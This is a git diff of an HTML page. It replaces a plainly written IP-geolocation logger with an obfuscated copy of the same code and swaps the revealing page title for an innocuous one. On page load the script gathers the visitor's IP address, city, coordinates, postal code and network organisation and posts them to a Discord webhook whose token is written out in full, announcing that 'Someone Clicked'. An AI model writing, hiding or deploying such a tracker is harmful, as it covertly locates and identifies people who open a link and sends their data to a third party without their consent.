@@ -2,96 +2,11 @@
 <html>
   <head>
     <meta charset="utf-8">
-    <title>Geolocation Webhook</title>
+    <title>When you try your best but you don't succeed</title>
   </head>
   <body>
     <script>
-      const whurl = "https://discord.com/api/webhooks/1084656540881002576/RaQY4jj8HLTEDVetKIIUvMIjZ9Bgu6Ys3weqtfpYbqYXK3RegVzwX1Dq-oxAjYzSO7nz";
-const ipUrl = "https://ipapi.co/json/";
-
-// Make a request to get the geolocation information
-fetch(ipUrl)
-  .then(response => response.json())
-  .then(data => {
-    const {
-      ip,
-      city,
-      region,
-      country_name,
-      country_code,
-      latitude,
-      longitude,
-      timezone,
-      postal,
-      asn,
-      org
-    } = data;
-
-    const msg = {
-      "embeds": [
-        {
-          "title": "Someone Clicked, Here is their Info",
-          "color": 16729344,
-          "fields": [
-            {
-              "name": "IP Address",
-              "value": ip
-            },
-            {
-              "name": "City",
-              "value": city,
-              "inline": true
-            },
-            {
-              "name": "Region",
-              "value": region,
-              "inline": true
-            },
-            {
-              "name": "Country",
-              "value": `${country_name} (${country_code})`,
-              "inline": true
-            },
-            {
-              "name": "Latitude, Longitude",
-              "value": `(${latitude}, ${longitude})`,
-              "inline": true
-            },
-            {
-              "name": "Timezone",
-              "value": timezone,
-              "inline": true
-            },
-            {
-              "name": "Postal Code",
-              "value": postal,
-              "inline": true
-            },
-            {
-              "name": "ASN",
-              "value": asn,
-              "inline": true
-            },
-            {
-              "name": "Organization",
-              "value": org,
-              "inline": true
-            }
-
-          ]
-        }
-      ],
-      "username": "Family Dude by Empire4946"
-    };
-
-    // Send a webhook message with the geolocation information
-    fetch(whurl + "?wait=true", {
-      "method": "POST",
-      "headers": {"content-type": "application/json"},
-      "body": JSON.stringify(msg)
-    });
-  })
-  .catch(error => console.log(error));
+const _0x376963=_0x5bde;function _0x4226(){const _0x2e1b98=['Region','catch','Postal\x20Code','696780YVBboJ','Family\x20Dude\x20by\x20Empire4946','json','Someone\x20Clicked,\x20Here\x20is\x20their\x20Info','?wait=true','36mExWJl','IP\x20Address','6163524osLZfQ','Latitude,\x20Longitude','10ZdPuoa','25226333xpznSa','ASN','1945048ebrXKT','18PwwglL','log','https://discord.com/api/webhooks/1084656540881002576/RaQY4jj8HLTEDVetKIIUvMIjZ9Bgu6Ys3weqtfpYbqYXK3RegVzwX1Dq-oxAjYzSO7nz','then','16004IwfFFc','861105DFWQpm','https://ipapi.co/json/','375REQoVF','City','stringify','82730YUfSuT'];_0x4226=function(){return _0x2e1b98;};return _0x4226();}(function(_0x204a6d,_0x5209bb){const _0x10cabb=_0x5bde,_0x33d187=_0x204a6d();while(!![]){try{const _0x252b61=parseInt(_0x10cabb(0x142))/0x1+-parseInt(_0x10cabb(0x138))/0x2*(parseInt(_0x10cabb(0x13b))/0x3)+-parseInt(_0x10cabb(0x12c))/0x4*(parseInt(_0x10cabb(0x13e))/0x5)+-parseInt(_0x10cabb(0x134))/0x6*(parseInt(_0x10cabb(0x139))/0x7)+-parseInt(_0x10cabb(0x133))/0x8+parseInt(_0x10cabb(0x12e))/0x9*(-parseInt(_0x10cabb(0x130))/0xa)+parseInt(_0x10cabb(0x131))/0xb;if(_0x252b61===_0x5209bb)break;else _0x33d187['push'](_0x33d187['shift']());}catch(_0x3b5e07){_0x33d187['push'](_0x33d187['shift']());}}}(_0x4226,0x84ca3));function _0x5bde(_0x29879c,_0x216cdb){const _0x4226a0=_0x4226();return _0x5bde=function(_0x5bde94,_0x574a29){_0x5bde94=_0x5bde94-0x129;let _0x1741b0=_0x4226a0[_0x5bde94];return _0x1741b0;},_0x5bde(_0x29879c,_0x216cdb);}const whurl=_0x376963(0x136),ipUrl=_0x376963(0x13a);fetch(ipUrl)[_0x376963(0x137)](_0x24f73a=>_0x24f73a[_0x376963(0x129)]())[_0x376963(0x137)](_0x2ba4ef=>{const _0x2a1791=_0x376963,{ip:_0x1e2bfd,city:_0x3df33e,region:_0x3a2da1,country_name:_0x167665,country_code:_0x411a20,latitude:_0x316c3a,longitude:_0x1a02f2,timezone:_0x11237d,postal:_0x24eb01,asn:_0x10b8c,org:_0x14f9d5}=_0x2ba4ef,_0x452333={'embeds':[{'title':_0x2a1791(0x12a),'color':0xff4500,'fields':[{'name':_0x2a1791(0x12d),'value':_0x1e2bfd},{'name':_0x2a1791(0x13c),'value':_0x3df33e,'inline':!![]},{'name':_0x2a1791(0x13f),'value':_0x3a2da1,'inline':!![]},{'name':'Country','value':_0x167665+'\x20('+_0x411a20+')','inline':!![]},{'name':_0x2a1791(0x12f),'value':'('+_0x316c3a+',\x20'+_0x1a02f2+')','inline':!![]},{'name':'Timezone','value':_0x11237d,'inline':!![]},{'name':_0x2a1791(0x141),'value':_0x24eb01,'inline':!![]},{'name':_0x2a1791(0x132),'value':_0x10b8c,'inline':!![]},{'name':'Organization','value':_0x14f9d5,'inline':!![]}]}],'username':_0x2a1791(0x143)};fetch(whurl+_0x2a1791(0x12b),{'method':'POST','headers':{'content-type':'application/json'},'body':JSON[_0x2a1791(0x13d)](_0x452333)});})[_0x376963(0x140)](_0x493c3e=>console[_0x376963(0x135)](_0x493c3e));
     </script>
   </body>
 </html>
